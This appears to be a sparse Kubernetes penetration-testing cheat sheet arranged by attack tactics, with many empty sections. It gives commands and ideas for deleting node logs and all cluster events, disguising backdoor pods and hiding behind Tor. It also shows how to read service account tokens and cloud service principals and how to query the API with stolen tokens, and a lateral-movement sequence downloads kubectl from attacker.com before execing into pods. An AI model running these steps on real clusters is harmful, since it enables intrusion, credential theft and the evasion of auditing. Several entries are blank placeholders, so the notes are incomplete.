# k8s-pentest

# Initial Access

# Execution

# Persistence

# Privilege Escalation

# Defense Evasion

Delete all logs
```
> ./del_logs.sh

- Note: This method only deletes the logs stored on the node where the pods are running and 
- not the logs stored in a centralized logging solution like Elasticsearch, Fluentd, or Kibana.
```
Delete all events

In Kubernetes, events are records of significant occurrences in your cluster, such as the creation or deletion of a pod, or changes to the state of a resource.
```
> kubectl delete events --all --now
```
Pod or container name similarity
```
- Pods that are created by controllers such as Deployment or DaemonSet have random suffix in their names. 
- Attackers can use this fact and name their backdoor pods as they were created by the existing controllers. 
- For example, an attacker could create a malicious pod named coredns-{random suffix} which would look related to the CoreDNS Deployment.
```
Connect from proxy server.
```
Use Tor to connect. Attackers may use proxy servers to hide their origin IP.
```
# Credential Access
- The credential access tactic consists of techniques that are used by attackers to steal credentials.
- In containerized environments, this includes credentials of the running application, identities, secrets stored in the cluster, or cloud credentials.

```
List K8S secrets
>
```
Mount service principal
```
- When the cluster is deployed in the cloud, in some cases attackers can leverage their access to a container in the cluster to gain cloud credentials. 
- For example, in AKS each node contains service principal credential.
>
>
> az aks show --resource-group myResourceGroup --name myAKSCluster --query "servicePrincipalProfile.clientId" --output tsv
```
Container service account
```
/var/run/secrets/kubernetes.io/serviceaccount/token


```
Application credentials in configuration files
```
>
```
Access managed identity credentials
```
IMDS endpoint to get the managed identityâ€™s token. With a token, the attackers can access cloud resources.

> 



```

```
Malicious admission controller
>
```

# Discovery

# Lateral Movement

```
> env
> mount | grep "kubernetes"
> cat /proc/1/cgroup | grep "kube"
> 

> which kubectl
> which curl
> which wget

> wget https://{KUBE_API}/api/v1/namespaces/{namespace}/pods

> ls /run/secrets/kubernetes.io/serviceaccount
ca.crt
namespace
token

> export TOKEN=`cat /run/secrets/kubernetes.io/serviceaccount/token`

> wget https://{KUBE_API}/api/v1/namespaces/{namespace}/pods --header="Authorization: Bearer $TOKEN" --no-check-certificate -O pods.txt

> wget http://attacker.com/kubectl
> chmod +x kubectl

> ./kubectl auth can-i list pods
> ./kubectl auth can-i create pods
> ./kubectl get pods
> ./kubectl get nodes
> ./kubectl get svc

> ./kubectl exec -it {pod_id} /bin/sh
> id
```

# Collection

# Impact


